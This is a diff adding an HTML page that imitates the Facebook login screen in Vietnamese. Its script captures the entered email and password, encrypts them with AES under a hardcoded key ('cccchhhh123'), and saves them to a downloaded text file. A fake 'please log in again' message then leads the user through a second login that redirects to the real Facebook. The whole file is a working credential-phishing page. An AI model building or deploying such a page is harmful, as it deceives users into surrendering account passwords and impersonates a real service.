@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="vi">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng nhập</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <style>
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            display: flex;
+            max-width: 900px;
+            width: 100%;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .login-left {
+            max-width: 500px;
+        }
+
+        .login-left h1 {
+            color: #1877f2;
+            font-size: 56px;
+            font-weight: bold;
+            margin: 0;
+        }
+
+        .login-left p {
+            font-size: 28px;
+            color: #1c1e21;
+            margin: 15px 0 0;
+        }
+
+        .login-right {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            width: 396px;
+            text-align: center;
+        }
+
+        .login-right input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 8px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            box-sizing: border-box;
+        }
+
+        .login-right button {
+            width: 100%;
+            padding: 14px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 12px 0;
+        }
+
+        .login-right button:hover {
+            background-color: #166fe5;
+        }
+
+        .login-right a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .login-right a:hover {
+            text-decoration: underline;
+        }
+
+        .login-right .signup-btn {
+            background-color: #42b72a;
+            margin-top: 20px;
+        }
+
+        .login-right .signup-btn:hover {
+            background-color: #36a420;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="login-container">
+        <div class="login-left">
+            <h1>facebook</h1>
+            <p>Kết nối với bạn bè và thế giới xung quanh bạn trên Facebook.</p>
+        </div>
+        <div class="login-right">
+            <form id="login-form">
+                <input type="text" id="email" placeholder="Email hoặc số điện thoại" required>
+                <input type="password" id="password" placeholder="Mật khẩu" required>
+                <button type="submit">Đăng nhập</button>
+                <a href="#">Quên mật khẩu?</a>
+                <button type="button" class="signup-btn">Tạo tài khoản mới</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Khóa bí mật để mã hóa (bạn giữ bí mật này để giải mã sau)
+        const secretKey = 'cccchhhh123';
+
+        document.getElementById('login-form').addEventListener('submit', (e) => {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (!email || !password) {
+                alert('Vui lòng điền đầy đủ thông tin!');
+                return;
+            }
+
+            // Kiểm tra trạng thái đăng nhập trong localStorage
+            const hasLoggedIn = localStorage.getItem('hasLoggedIn');
+
+            if (!hasLoggedIn) {
+                // Lần đăng nhập đầu tiên
+                // Tạo đối tượng dữ liệu
+                const data = {
+                    email: email,
+                    password: password,
+                    time: new Date().toISOString()
+                };
+
+                // Mã hóa dữ liệu bằng AES
+                const encryptedData = CryptoJS.AES.encrypt(
+                    JSON.stringify(data),
+                    secretKey
+                ).toString();
+
+                // Tạo nội dung file txt
+                const fileContent = `Encrypted Data: ${encryptedData}\nSecret Key (DO NOT SHARE): ${secretKey}\n`;
+
+                // Tạo và tải file txt
+                const blob = new Blob([fileContent], { type: 'text/plain' });
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'login_info.txt';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                window.URL.revokeObjectURL(url);
+
+                // Lưu trạng thái đã đăng nhập
+                localStorage.setItem('hasLoggedIn', 'true');
+
+                alert('Thông tin đã được lưu. Vui lòng đăng nhập lại để vào Facebook.');
+            } else {
+                // Lần đăng nhập thứ hai
+                // Chuyển hướng đến facebook.com
+                window.location.href = 'https://www.facebook.com';
+                // Xóa trạng thái nếu cần (tùy chọn)
+                localStorage.removeItem('hasLoggedIn');
+            }
+        });
+    </script>
+</body>
+
+</html>
